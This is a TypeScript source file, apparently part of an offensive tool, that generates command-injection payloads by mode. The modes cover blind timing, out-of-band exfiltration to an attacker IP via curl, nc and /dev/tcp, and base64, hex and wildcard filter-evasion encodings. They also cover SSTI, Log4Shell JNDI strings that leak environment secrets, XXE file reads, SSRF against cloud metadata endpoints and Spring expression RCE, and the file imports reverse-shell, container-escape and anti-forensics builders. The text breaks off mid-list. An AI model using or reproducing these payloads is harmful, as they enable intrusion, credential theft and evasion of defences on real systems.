import { buildReverseShells, buildCloudMetaPayloads, buildContainerEscapes,
         buildTimingPayloads, buildWindowsTimingPayloads, buildStealthPayloads,
         buildWindowsPayloads, buildWindowsReverseShells, buildAntiForensicsPayloads,
         buildLowNoiseOobPayloads } from "./bypassEngine.js";

const TAB = "\t";
const IFS = "${IFS}";

function b64(s: string): string { return Buffer.from(s).toString("base64"); }
function hexEsc(s: string): string {
  return [...Buffer.from(s)].map(b => `\\x${(b as number).toString(16).padStart(2,"0")}`).join("");
}
function rawHex(s: string): string { return Buffer.from(s).toString("hex"); }

export function generateSuggestions(
  mode: string | undefined,
  baseCmd = "id",
  attackerIp = "127.0.0.1",
  attackerPort = "4444",
): string[] {
  const b    = (baseCmd || "id").trim();
  const b64s = b64(b);
  const hex  = hexEsc(b);
  const rhex = rawHex(b);

  switch (mode) {

    case "blind":
      return [
        `${b} && sleep 7`,
        `${b}||(sleep 9)`,
        `${b}; _t=$SECONDS; sleep 6; echo $((SECONDS-_t))`,
        `${b} & sleep 5 && wait`,
        `${b} && bash -c 'read -t 8 x'`,
        `${b}; ping -c 7 -i 1 127.0.0.1 >/dev/null`,
        `${b} && python3 -c "import time;time.sleep(8)"`,
        `${b} && perl -e "sleep 9"`,
        `{ ${b}; } && sleep 6 || sleep 6`,
        `${b}; for i in 1 2 3 4 5 6 7; do sleep 1; done`,
        `${b} && node -e "setTimeout(()=>{},8000)" 2>/dev/null`,
        `${b}; ruby -e "sleep 7" 2>/dev/null`,
        `${b}; php -r "sleep(7);" 2>/dev/null`,
        `${b} || sleep 10`,
        `${b}; /bin/sleep 7`,
        `${b};{sleep,7}`,
        `${b}%0asleep%207`,
        `${b}\nsleep 7`,
        `${b}; java -cp . java.lang.Thread.sleep 7000 2>/dev/null`,
        `${b}; /usr/bin/sleep 7`,
        `${b}; python -c "import time;time.sleep(7)" 2>/dev/null`,
        `${b}; usleep 7000000`,
      ];

    case "oob":
      return [
        `${b} && curl -sk "http://${attackerIp}:${attackerPort}/?x=$(${b}|base64 -w0)"`,
        `${b} && nslookup "$(${b}|head -c20|tr -cd '[:alnum:]').${attackerIp}"`,
        `${b} && wget -qO- "http://${attackerIp}:${attackerPort}/?d=$(${b}|base64 -w0)"`,
        `${b} && curl -sk -X POST "http://${attackerIp}:${attackerPort}/" --data-urlencode "d=$(${b})"`,
        `${b} | curl -sk -T- "http://${attackerIp}:${attackerPort}/upload"`,
        `${b} && dig +short "$(${b}|head -c20|tr -cd '[:alnum:]').ns.${attackerIp}"`,
        `${b} | python3 -c "import sys,urllib.request;urllib.request.urlopen('http://${attackerIp}:${attackerPort}/?x='+__import__('base64').b64encode(sys.stdin.buffer.read()).decode())"`,
        `${b} | openssl s_client -connect ${attackerIp}:${attackerPort} -quiet 2>/dev/null`,
        `${b} | nc -q1 ${attackerIp} ${attackerPort} 2>/dev/null`,
        `${b} > /tmp/.nx_$$; curl -sk -F 'f=@/tmp/.nx_$$' "http://${attackerIp}:${attackerPort}/"; rm -f /tmp/.nx_$$`,
        `${b} && curl -sk -H "X-Data: $(${b}|base64 -w0)" "http://${attackerIp}:${attackerPort}/"`,
        `${b} | socat - TCP:${attackerIp}:${attackerPort} 2>/dev/null`,
        `${b} && curl -sk --data-binary @- "http://${attackerIp}:${attackerPort}/" <<< "$(${b} 2>&1)"`,
        `_o=$(${b} 2>&1);curl -sk "http://${attackerIp}:${attackerPort}/?h=$(hostname)&u=$(whoami)&d=$(echo $_o|base64 -w0)"`,
        `exec 3>/dev/tcp/${attackerIp}/${attackerPort};printf 'GET /?d='$(${b} 2>&1|base64 -w0)' HTTP/1.0\r\nHost: ${attackerIp}\r\n\r\n'>&3 2>/dev/null`,
        `${b} && python3 -c "import socket,base64,os;d=base64.b64encode(os.popen('${b.replace(/'/g,"\\'")}').read().encode()).decode();s=socket.socket();s.connect(('${attackerIp}',${attackerPort}));s.send(('GET /?d='+d+' HTTP/1.0\r\nHost: ${attackerIp}\r\n\r\n').encode());s.close()"`,
        `${b} 2>&1 | perl -MLWP::UserAgent -ne 'END{my $ua=LWP::UserAgent->new;$ua->get("http://${attackerIp}:${attackerPort}/?d=".join("",@d))}push@d,$_' 2>/dev/null`,
      ];

    case "quantum": {
      const b64full = b64(`${b} && uname -a && id`);
      const b64env  = b64(`${b} && env`);
      const b64x2   = b64(b64s);
      const b64x3   = b64(b64x2);
      return [
        `{echo,${b64s}}|{base64,-d}|bash`,
        `bash<<<$(echo${TAB}${b64s}|base64${TAB}-d)`,
        `eval "$(printf '${hex}')"`,
        `{echo,${b64full}}|{base64,-d}|{bash,}`,
        `$(printf '${hex}') && uname -a`,
        `python3 -c "import base64,os;os.system(base64.b64decode('${b64s}').decode())"`,
        `perl -e "system(pack('H*','${rhex}'))"`,
        `ruby -e "require 'base64';system(Base64.decode64('${b64s}'))"`,
        `node -e "require('child_process').execSync(Buffer.from('${b64s}','base64').toString(),{stdio:'inherit'})"`,
        `_x=$(echo ${b64env}|base64 -d);eval${TAB}$_x`,
        `$(which bash) -c "$(echo ${b64s}|base64 -d)"`,
        `bash -c "$(printf '%b' '${hex}')"`,
        `{ _a="${b64x2}";bash<<<$(echo "$_a"|base64 -d|base64 -d); }`,
        `echo ${rhex}|xxd -r -p|bash`,
        `bash <(echo ${b64s}|base64 -d)`,
        `source <(echo ${b64s}|base64 -d)`,
        `{ _a="${b64x3}";bash<<<$(echo "$_a"|base64 -d|base64 -d|base64 -d); }`,
        `echo ${rhex}|perl -pe 's/([0-9a-f]{2})/chr(hex($1))/gie'|bash`,
        `python3 -c "import os;os.system(bytes.fromhex('${rhex}').decode())"`,
        `node -e "require('child_process').execSync(Buffer.from('${rhex}','hex').toString(),{stdio:'inherit'})"`,
      ];
    }

    case "ifs":
      return [
        `${b.replace(/ /g, IFS)}`,
        `cat${IFS}/etc/passwd`,
        `id;${IFS}uname${IFS}-a`,
        `bash${IFS}-c${IFS}${JSON.stringify(b)}`,
        `{ IFS=,; set -- ${b.replace(/ /g, ",")}; "$@"; }`,
        `${b.replace(/ /g, "\t")}`,
        `env${IFS}PATH=/bin${IFS}${b.replace(/ /g, IFS)}`,
        `eval${IFS}$(echo${IFS}${b64s}|base64${IFS}-d)`,
        `IFS=$'\\n\\t '; ${b.replace(/ /g, IFS)}`,
        `${b.replace(/ /g, "${IFS:0:1}")}`,
        `${b.replace(/ /g, "$'\\x20'")}`,
        `${b.replace(/ /g, "$'\\t'")}`,
        `bash${IFS}<<<$(echo${IFS}${b64s}|base64${IFS}-d)`,
        `{ IFS=:; set -- ${b.replace(/ /g, ":")}; "$@"; }`,
        `${b.replace(/ /g, "${IFS:1:1}")}`,
        `{ X=${JSON.stringify(b)};IFS=' ';eval $X; }`,
      ];

    case "concat":
      return [
        `c'a't${IFS}/etc/passwd`,
        `id;who'a'mi`,
        `ca""t${IFS}/etc/shadow`,
        `ec""ho${IFS}test`,
        `/bin/c'a't${IFS}/etc/pa'ss'wd`,
        `${b.replace(/([a-z])([a-z])/g, "$1''$2")}`,
        `w'h'o'a'm'i`,
        `b"a"sh -c ${JSON.stringify(b)}`,
        `${b.split("").map((c,i)=>(/[a-z]/.test(c)&&i%3===0?`"${c}"`:c)).join("")}`,
        `_a=${JSON.stringify(b.slice(0,2))};_b=${JSON.stringify(b.slice(2))};_c="$_a$_b";$_c`,
        `${b.replace(/([a-z]{2})([a-z])/g,(_,a,c)=>a+'""'+c)}`,
        `${b.replace(/([a-z])([a-z]{2})/g,(_,a,bc)=>a+"''"+bc)}`,
        `${b.split(" ").map(w=>w.split("").map((c,i)=>i===0?`"${c}"`:c).join("")).join(" ")}`,
        `${b.replace(/([a-z])([a-z]{3,})/g,(_,a,rest)=>a+"${}"+rest)} 2>/dev/null||${b}`,
      ];

    case "hex":
      return [
        `eval "$(printf '${hex}')"`,
        `perl -e "system(pack('H*','${rhex}'))"`,
        `python3 -c "import os;os.system(bytes.fromhex('${rhex}').decode())"`,
        `node -e "require('child_process').execSync(Buffer.from('${rhex}','hex').toString(),{stdio:'inherit'})"`,
        `$(printf '${hex}')`,
        `{ _NX="$(printf '${hex}')"; eval "$_NX"; }`,
        `echo ${rhex}|xxd -r -p|bash`,
        `ruby -e "system([${[...Buffer.from(b)].map(x=>(x as number).toString()).join(",")}].pack('C*'))"`,
        `bash -c "$(printf '%b' '${hex}')"`,
        `printf '${hex}'|bash`,
        `printf '%b' '${hex}'|bash`,
        `echo ${rhex}|perl -pe 's/([0-9a-f]{2})/chr(hex($1))/gie'|bash`,
        `python3 -c "import codecs,os;os.system(codecs.decode('${rhex}','hex').decode())"`,
        `{ _h="${rhex}";python3 -c "import os;os.system(bytes.fromhex('$_h').decode())"; }`,
      ];

    case "b64loop": {
      const b64x2 = b64(b64s);
      const b64x3 = b64(b64x2);
      const b64x4 = b64(b64x3);
      return [
        `bash<<<$(echo${TAB}${b64s}|base64${TAB}-d)`,
        `{echo,${b64s}}|{base64,-d}|{bash,}`,
        `{ _a="${b64x2}"; _b=$(echo "$_a"|base64 -d|base64 -d); bash<<<$_b; }`,
        `{ bash<<<$(echo "${b64x3}"|base64 -d|base64 -d|base64 -d); }`,
        `{ bash<<<$(echo "${b64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); }`,
        `perl -MMIME::Base64 -e "system(decode_base64('${b64s}'))"`,
        `python3 -c "import base64,os;os.system(base64.b64decode('${b64s}').decode())"`,
        `ruby -e "require 'base64';system(Base64.decode64('${b64s}'))"`,
        `node -e "require('child_process').execSync(Buffer.from('${b64s}','base64').toString(),{stdio:'inherit'})"`,
        `echo ${b64s}|base64 -d|bash`,
        `$(which bash)<<<$(echo ${b64s}|base64 -d)`,
        `echo ${b64s}|openssl enc -d -base64|bash`,
        `bash -c "$(echo ${b64x2}|base64 -d|base64 -d)"`,
        `python3 -c "import base64 as b,os;os.system(b.b64decode(b.b64decode('${b64x2}')).decode())"`,
      ];
    }

    case "env":
      return [
        `_NX=${JSON.stringify(b)};eval $_NX`,
        `export _CMD=${JSON.stringify(b)}; bash -c "$_CMD"`,
        `_A=${JSON.stringify(b.split(" ")[0]??b)}; _B=${JSON.stringify(b.split(" ").slice(1).join(" "))}; $_A $_B`,
        `declare _NX=${JSON.stringify(b)}; eval "$_NX"`,
        `printf -v _NX '%s' ${JSON.stringify(b)}; eval "$_NX"`,
        `read _NX <<< ${JSON.stringify(b)}; bash -c "$_NX"`,
        `_C=bash; _X=${JSON.stringify(b)}; $_C -c "$_X"`,
        `env _NX=${JSON.stringify(b)} bash -c 'eval $_NX'`,
        `BASH_ENV=/dev/stdin bash <<<${JSON.stringify(b)}`,
        `typeset _NX=${JSON.stringify(b)}; eval "$_NX"`,
        `local _NX=${JSON.stringify(b)} 2>/dev/null; eval "$_NX"`,
        `{ mapfile -t _A <<<${JSON.stringify(b)}; ${JSON.stringify(b.split(" ")[0]??b)} "${JSON.stringify(b.split(" ").slice(1).join(" "))}"; } 2>/dev/null`,
        `_X=${JSON.stringify(b)};$BASH -c "$_X"`,
        `_X=${JSON.stringify(b)};$SHELL -c "$_X"`,
      ];

    case "heredoc": {
      const mk = `NXHD${Math.floor(Math.random()*9000)+1000}`;
      return [
        `bash<<'${mk}'\n${b}\n${mk}`,
        `bash<<${mk}\n${b}\n${mk}`,
        `sh<<'NXEOF'\n${b}\nNXEOF`,
        `python3 <<'PYEOF'\nimport os\nos.system(${JSON.stringify(b)})\nPYEOF`,
        `perl <<'PLEOF'\nsystem(${JSON.stringify(b)});\nPLEOF`,
        `ruby <<'RBEOF'\nsystem(${JSON.stringify(b)})\nRBEOF`,
        `node <<'JSEOF'\nrequire('child_process').execSync(${JSON.stringify(b)},{stdio:'inherit'});\nJSEOF`,
        `bash -c $(cat <<'EOF'\n${b}\nEOF\n)`,
        `zsh <<'ZEOF'\n${b}\nZEOF`,
        `php -r 'system(${JSON.stringify(b)});' <<'PHPEOF'\nPHPEOF`,
      ];
    }

    case "unicode": {
      const hexPrint = b.replace(/[a-zA-Z]/g,
        c => `$(printf '\\x${c.charCodeAt(0).toString(16).padStart(2,"0")}')`
      );
      return [
        hexPrint,
        `$(printf '${hex}')`,
        `eval "$(printf '${hex}')"`,
        `bash -c "$(printf '%b' '${hex}')"`,
        `printf '%b' '${hex}' | bash`,
        `${b.split("").map(c=>`$(printf '\\x${c.charCodeAt(0).toString(16).padStart(2,"0")}')`).join("")}`,
        `python3 -c "import os;os.system(bytes([${[...Buffer.from(b)].map(x=>(x as number).toString()).join(",")}]).decode())"`,
        `node -e "require('child_process').execSync(String.fromCharCode(${[...Buffer.from(b)].map(x=>(x as number).toString()).join(",")}),{stdio:'inherit'})"`,
        `printf '%s' $'${[...Buffer.from(b)].map(x=>`\\x${(x as number).toString(16).padStart(2,"0")}`).join("")}'|bash`,
        `eval $'${[...Buffer.from(b)].map(x=>`\\x${(x as number).toString(16).padStart(2,"0")}`).join("")}'`,
      ];
    }

    case "null":
      return [
        `${b}$'\\x00'`,
        `${b}%00`,
        `{ ${b}$'\\x00'; } 2>/dev/null`,
        `printf '${hex}\\x00'|bash`,
        `${b}\x00`,
        `bash -c "${b.replace(/"/g,'\\"')}$'\\x00'"`,
        `python3 -c "import os;os.system(${JSON.stringify(b)}+chr(0))"`,
        `${b}%00.jpg`,
        `${b}\0`,
        `${b}\u0000`,
      ];

    case "wildcard":
      return [
        `/???/b??h -c "${b}"`,
        `/???/b??h<<<$(echo ${b64s}|base64 -d)`,
        `/???/[a-z][a-z]???h -c "${b}"`,
        `ls /b??/* 2>/dev/null|head -1|xargs -I{} {} -c "${b}"`,
        `${b.replace(/([a-zA-Z])([a-zA-Z])/g,(_,a,c)=>a+"?"+c)}`,
        `/[b][i][n]/[b][a][s][h] -c "${b}"`,
        `/b??/b??h -c "${b}"`,
        `$(ls /bin/b* 2>/dev/null|head -1) -c "${b}"`,
        `{b,}a{s,}h -c "${b}"`,
        `/usr/b??/env bash -c "${b}"`,
        `/???/b??h -c "$(printf '${hex}')"`,
        `/???/b??h<<<$(printf '${hex}')`,
        `ls /usr/bin/p* 2>/dev/null|grep -m1 ython|xargs -I{} {} -c "import os;os.system(${JSON.stringify(b)})"`,
      ];

    case "comment":
      return [
        `${b.split(" ").join(" #c\\\n")}`,
        `${b.replace(/ /g, "/**/")}`,
        `bash -c $'${b.replace(/'/g,"\\'").replace(/ /g," #\\n")}'`,
        `${b.replace(/ /g, " #nx\\\n")}`,
        `{ ${b.split(" ").join("; : #;\n")}; }`,
        `${b.replace(/ /g, " -- ")}`,
        `${b.replace(/ /g, " # comment\\\n")}`,
        `${b.split(" ").join("\t#c\\\n")}`,
        `${b}${" "}# this is a comment`,
        `${b};#`,
      ];

    case "double_enc":
      return [
        `bash -c "$(printf '%b' '${hex}')"`,
        `eval $(printf '%b' '${hex}')`,
        `bash<<<$(printf '%b' '${hex}')`,
        `printf '%b' '${hex}'|bash`,
        `eval "$(echo '${b64(b64s)}'|base64 -d|base64 -d)"`,
        `$(printf '%b' '${hex}')`,
        `bash -c "$(printf '%b' '${hexEsc(hex)}')"`,
        `{ _x=$(printf '%b' '${hex}');eval "$_x"; }`,
        `python3 -c "import codecs,os;os.system(codecs.decode(codecs.decode('${b64(b64s)}','base64').decode(),'base64').decode())"`,
      ];

    case "brace":
      return [
        `{echo,${b64s}}|{base64,-d}|{bash,}`,
        `{b,}a{s,}h -c ${JSON.stringify(b)}`,
        `{/bin/,}bash -c ${JSON.stringify(b)}`,
        `{echo,$(echo${IFS}${b64s})}|{base64,-d}|{bash,}`,
        `{b,}a{s,}h<<<$(echo${IFS}${b64s}|{base64,-d})`,
        `{b,}a{s,}h -c "$(printf '${hex}')"`,
        `[[ 1 -eq 1 ]] && {b,}a{s,}h -c ${JSON.stringify(b)}`,
        `{echo,${b64(b64s)}}|{base64,-d}|{base64,-d}|{bash,}`,
        `{p,}y{t,}ho{n,}3 -c "import os;os.system(${JSON.stringify(b)})"`,
      ];

    case "process_sub":
      return [
        `bash <(echo ${b64s}|base64 -d)`,
        `source <(echo ${b64s}|base64 -d)`,
        `. <(echo ${b64s}|base64 -d)`,
        `bash <(printf '${hex}')`,
        `bash <(printf '%b' '${hex}')`,
        `eval <(echo ${b64s}|base64 -d)`,
        `bash <(python3 -c "import base64;print(base64.b64decode('${b64s}').decode())")`,
        `. <(printf '${hex}')`,
        `source <(printf '%b' '${hex}')`,
        `bash <(perl -MMIME::Base64 -e "print decode_base64('${b64s}')")`,
      ];

    case "arith": {
      const codes = [...Buffer.from(b)].map(x=>(x as number).toString()).join(",");
      return [
        `bash -c "$(printf '${hex}')"`,
        `$(for _c in ${codes};do printf "\\\\$(printf '%03o' $_c)";done)`,
        `python3 -c "import os;os.system(bytes([${codes}]).decode())"`,
        `node -e "require('child_process').execSync(String.fromCharCode(${codes}),{stdio:'inherit'})"`,
        `perl -e "system(chr(${codes.replace(/,/g,").chr(")}))"`,
        `ruby -e "system([${codes}].pack('C*'))"`,
        `php -r "system(implode(array_map('chr',array(${codes}))));"`,
        `python3 -c "exec(bytes([${codes}]).decode())"`,
      ];
    }

    case "ansi_c": {
      const ansi = [...b].map(c=>{
        if(c==="'") return "\\'";
        if(c==="\\") return "\\\\";
        const code = c.charCodeAt(0);
        if(code < 0x20) return `\\x${code.toString(16).padStart(2,"0")}`;
        return c;
      }).join("");
      return [
        `bash -c $'${ansi}'`,
        `eval $'${hexEsc(b)}'`,
        `bash -c $'${hexEsc(b)}'`,
        `eval $'${[...Buffer.from(b)].map(x=>`\\${(x as number).toString(8).padStart(3,"0")}`).join("")}'`,
        `{ _c=$'${hexEsc(b)}';eval "$_c"; }`,
        `sh -c $'${ansi}'`,
        `$0 -c $'${ansi}'`,
      ];
    }

    case "rev": {
      const rev = b.split("").reverse().join("");
      const b64rev = b64(rev);
      return [
        `echo ${JSON.stringify(rev)}|rev|bash`,
        `bash -c "$(echo ${b64rev}|base64 -d|rev)"`,
        `python3 -c "import os;os.system(${JSON.stringify(rev)}[::-1])"`,
        `perl -e "system(scalar reverse ${JSON.stringify(rev)})"`,
        `node -e "require('child_process').execSync(${JSON.stringify(rev)}.split('').reverse().join(''),{stdio:'inherit'})"`,
        `ruby -e "system(${JSON.stringify(rev)}.reverse)"`,
        `{ _r=${JSON.stringify(rev)};_f=$(echo "$_r"|rev);bash -c "$_f"; }`,
      ];
    }

    case "timing":
      return buildTimingPayloads(7);

    case "windows_timing":
      return buildWindowsTimingPayloads(7);

    case "stealth":
      return buildStealthPayloads(b);

    case "windows":
      return buildWindowsPayloads(b);

    case "windows_rev":
      return buildWindowsReverseShells(attackerIp, attackerPort);

    case "antiforensics":
      return buildAntiForensicsPayloads(b);

    case "ssti":
      return [
        `{{7*7}}`,
        `{{7*'7'}}`,
        `{{config.items()}}`,
        `{{config.__class__.__init__.__globals__['os'].popen('${b}').read()}}`,
        `{{lipsum.__globals__['os'].popen('${b}').read()}}`,
        `{{cycler.__init__.__globals__.os.popen('${b}').read()}}`,
        `{{joiner.__init__.__globals__.os.popen('${b}').read()}}`,
        `{{namespace.__init__.__globals__.os.popen('${b}').read()}}`,
        `{{request.application.__globals__.__builtins__.__import__('os').popen('${b}').read()}}`,
        `{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('${b}').read()}}{% endif %}{% endfor %}`,
        `${7*7}`, `#{7*7}`, `<%=7*7%>`,
        `<%= system('${b}') %>`,
        `<%= \`${b}\` %>`,
        `*{T(java.lang.Runtime).getRuntime().exec('${b}')}`,
        `\${T(java.lang.Runtime).getRuntime().exec('${b}')}`,
        `#set($e="exp")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${b}")`,
        `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
        `{{'${b}'|filter('system')}}`,
        `{{constructor.constructor('return process.mainModule.require("child_process").execSync("${b}")')()}}`,
        `{{range.constructor("return global.process.mainModule.require('child_process').execSync('${b}').toString()")()}}`,
        `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("${b}").toString()')()}}`,
        `{#with "s" as |string|}{#with "e"}{#with split as |conslist|}{#each conslist}{#with (string.sub.apply 0 conslist)}{#with (string.sub.apply 0 conslist)}{{lookup (lookup this "constructor") "constructor"}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{log this}}{{/with}}`,
      ];

    case "log4shell": {
      const lh = attackerIp; const lp = attackerPort;
      return [
        `\${jndi:ldap://${lh}:${lp}/exploit}`,
        `\${jndi:rmi://${lh}:${lp}/exploit}`,
        `\${jndi:dns://${lh}:${lp}/exploit}`,
        `\${jndi:corba://${lh}:${lp}/exploit}`,
        `\${j\${::-n}di:ldap://${lh}:${lp}/exploit}`,
        `\${j\${lower:n}di:ldap://${lh}:${lp}/exploit}`,
        `\${jndi:\${lower:l}dap://${lh}:${lp}/exploit}`,
        `\${j\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://${lh}:${lp}/exploit}`,
        `\${J\${::-N}\${::-D}\${::-I}:\${::-L}\${::-D}\${::-A}\${::-P}://${lh}:${lp}/exploit}`,
        `\${jndi:ldap://${lh}:${lp}/\${env:JAVA_VERSION}}`,
        `\${jndi:ldap://${lh}:${lp}/\${env:AWS_SECRET_ACCESS_KEY}}`,
        `\${jndi:ldap://${lh}:${lp}/\${sys:java.version}}`,
        `\${jndi:ldap://${lh}:${lp}/\${hostName}}`,
        `\${ind\${base64:aQ==}:\${::-l}dap://${lh}:${lp}/exploit}`,
        `%24%7Bjndi%3Aldap%3A%2F%2F${lh}%3A${lp}%2Fexploit%7D`,
        `\${jndi:ldap://\${env:NaN:-${lh}}:${lp}/exploit}`,
        `\${jndi:ldap://${lh}:${lp}/\${java:os}}`,
        `\${jndi:\${lower:l}\${lower:d}\${lower:a}\${lower:p}://${lh}:${lp}/exploit}`,
        `\${jndi:ldap://${lh}:${lp}/\${sys:user.name}}`,
        `\${jndi:ldap://${lh}:${lp}/\${sys:user.home}}`,
        `\${jndi:ldap://${lh}:${lp}/\${env:PATH}}`,
        `\${jndi:ldap://${lh}:${lp}/\${java:vm}}`,
        `\${jndi:ldap://${lh}:${lp}/\${ctx:loginId}}`,
        `\${jndi:ldaps://${lh}:${lp}/exploit}`,
        `\${jndi:iiop://${lh}:${lp}/exploit}`,
        `\${j${"{"}::-n${"}"}di:ldap://${lh}:${lp}/a}`,
        `\${${"{"}lower:j${"}"}ndi:ldap://${lh}:${lp}/a}`,
        `\${::-\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://${lh}:${lp}/a}`,
      ];
    }

    case "xxe": {
      const xh = attackerIp; const xp = attackerPort;
      return [
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/shadow">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/cmdline">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "http://${xh}:${xp}/xxe">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % d SYSTEM "http://${xh}:${xp}/evil.dtd">%d;]><r></r>`,
        `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r[<!ENTITY x SYSTEM "expect://${b}">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "dict://127.0.0.1:11211/stat">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "ftp://${xh}:${xp}/x">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % p1 "<!ENTITY exfil SYSTEM 'http://${xh}:${xp}/?x=%25c;'>"><!ENTITY % c SYSTEM "file:///etc/passwd">%p1;]><r>&exfil;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/maps">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "netdoc:///etc/passwd">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://${xh}:${xp}/r.dtd"><r>&exfil;</r>`,
      ];
    }

    case "polyglot":
      return [
        `'; ${b}; echo '`,
        `" && ${b} && "`,
        `$(${b})`,
        "`" + b + "`",
        `{{${b}}}; ${b}; echo ${b}`,
        `'; ${b}; {{${b}}}; <!--${b}-->; "`,
        `1' OR '1'='1'; ${b}; --`,
        `<svg onload="${b}">`,
        `javascript:${b}//`,
        `${b}%0A${b}%0D%0A${b}`,
        `<![CDATA[${b}]]>`,
        `{${b}}; ${b}; \${${b}}`,
        `'+(${b})+'`,
        `\`;${b};//`,
        `${b}\r\n${b}`,
        `<script>${b}</script>`,
        `\${${b}}`,
        `#{${b}}`,
        `<%=${b}%>`,
        `[[${b}]]`,
        `{#${b}#}`,
        `@(${b})`,
      ];

    case "rev_shell":
      return buildReverseShells(attackerIp, attackerPort);

    case "cloud":
      return buildCloudMetaPayloads(b);

    case "container":
      return buildContainerEscapes(b);

    case "ssrf":
      return [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO%0d%0a",
        "dict://127.0.0.1:11211/stat",
        "http://127.0.0.1:9200/_cat/indices",
        "http://127.0.0.1:2375/containers/json",
        "http://127.0.0.1:10250/pods",
        "http://127.0.0.1:8080/actuator/env",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
        "http://[::1]/",
        "http://0177.0.0.1/",
        "http://0x7f000001/",
        `http://127.0.0.1/?${b}`,
        `gopher://127.0.0.1:6379/_SLAVEOF%20127.0.0.1%206380%0d%0a`,
        `http://127.0.0.1:8500/v1/kv/?recurse`,
        "http://169.254.169.254/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/",
        "http://192.168.0.1/",
        "http://10.0.0.1/",
        "http://2130706433/",
        "http://0/",
        "http://localhost/",
        "http://127.1/",
        "http://127.0.1/",
        "http://0:80/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://127.0.0.1.nip.io/",
        "http://localtest.me/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:5432/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:4848/",
        "http://fd00:ec2::254/latest/meta-data/",
      ];

    case "spring":
      return [
        `${"${"}T(java.lang.Runtime).getRuntime().exec('${b.replace(/'/g,"\\'")}')${"}"}`,
        `${"${"}T(java.lang.ProcessBuilder).new(new String[]{"/bin/bash","-c","${b.replace(/"/g,'\\"')}"}).start()${"}"}`,
        `${"#{"}new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('${b.replace(/'/g,"\\'")}').getInputStream()).useDelimiter('\\\\A').next()${"}"}`,
        `*{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","${b.replace(/"/g,'\\"')}"})}`,
        `${"${"}T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('${b.replace(/'/g,"\\'")}').getInputStream())${"}"}`,
        `${"${"}new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))${"}"}`,
        `${"${"}T(java.lang.System).getenv()${"}"}`,
        `${"${"}T(java.lang.Runtime).getRuntime().exec('id')${"}"}`,
        `__${"${"}T(java.lang.Runtime).getRuntime().exec('${b.replace(/'/g,"\\'")}')${"}"}__`,
        `${"${"}T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})${"}"}`,
        `${"#{"}T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","${b.replace(/"/g,'\\"')}"})${"}"}`,
        `${"${"}T(java.lang.Runtime).getRuntime().exec('whoami')${"}"}`,
        `${"${"}T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","${b.replace(/"/g,'\\"')}"}).getInputStream()${"}"}`,
        `${"${"}T(java.net.InetAddress).getByName('${attackerIp}').toString()${"}"}`,
